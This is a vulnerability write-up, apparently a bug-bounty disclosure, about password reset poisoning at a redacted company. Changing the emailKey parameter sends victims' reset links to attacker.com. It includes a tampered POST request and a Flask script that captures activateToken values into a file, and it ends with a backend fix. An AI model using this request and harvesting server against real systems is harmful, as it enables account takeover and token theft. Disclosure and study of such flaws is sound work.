# Exploiting Password Reset Vulnerabilities: A Case Study

## Introduction

Password reset features are critical to account recovery workflows, but misconfigurations can open the door to severe security risks. Recently, I discovered a vulnerability in the password reset implementation of **[Redacted Company]**, which allowed an attacker to hijack the password reset process and potentially compromise user accounts.

---

## Summary of the Vulnerability

The vulnerability was found in the password reset mechanism of the platform, specifically in how the `emailKey` parameter was handled in the form data. By altering this parameter, an attacker could redirect password reset requests to their own malicious website.

---

## Steps to Reproduce

1. **Create an account**: Register a new account on **[Redacted Company]**'s platform.  
2. **Initiate password reset**: Request a password reset for the account.  
3. **Capture the request**: Intercept the reset request using a proxy tool like Burp Suite or similar.  
4. **Modify the payload**: Replace the `emailKey` parameter from the legitimate URL to a malicious domain.  
   - Example:  
     ```plaintext
     emailKey=https://www.[redacted].com/.edm.FGTPASS.data
     ```
     becomes  
     ```plaintext
     emailKey=https://attacker.com/.edm.FGTPASS.data
     ```
5. **Send the modified request**: The victim receives an email with the manipulated reset link.  
6. **Click the reset link**: When the victim clicks the link, the attacker harvests sensitive tokens (e.g., `activateToken`) and gains control of the account.

## Supporting Material

### Request Example:

```http
POST /[redacted]/users/forgotpassword HTTP/2
Host: www.[redacted].com
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

email={VICTIM_EMAIL}&userName={VICTIM_USERNAME}&emailKey=https%3A%2F%2Fattacker.com%2F.edm.FGTPASS.data
```
---
---

## Exploitation Code:

```
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/')
def index():
    return 'Welcome to Attacker\'s Site!'

@app.route('/.edm.FGTPASS.data')
def capture_token():
    args = request.args
    if "activateToken" in args:
        token = args.get("activateToken")
        with open("stolen_tokens.txt", "a") as file:
            file.write(f"{token}\n")
    return "Token captured!"
```
this will mimic the original /.edm.FGTPASS.data and steal the ``activateToken``, then upload to the server. By replacing the ``emailKey``, we are able to steal  the ``activateToken``.

## Conclusion

Do not trust client-side request, do not put something like this. The email template should be prepared in the backend.
